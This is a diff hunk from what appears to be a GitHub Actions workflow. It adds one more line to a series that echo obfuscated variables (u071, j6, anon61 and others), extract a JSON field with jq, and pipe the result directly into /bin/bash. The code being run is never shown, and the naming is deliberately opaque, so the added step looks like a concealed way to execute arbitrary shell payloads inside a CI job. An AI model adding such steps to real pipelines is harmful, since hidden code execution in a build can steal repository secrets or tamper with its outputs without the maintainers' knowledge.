@@ -39,6 +39,7 @@ jobs:
           echo $u071 | jq -r .d108 | /bin/bash
           echo $j6 | jq -r .r67 | /bin/bash
           printf '%s' "$txxt02159" | jq -r .fhfo203 | /bin/bash
+          echo $anon61 | jq -r .jbd067 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
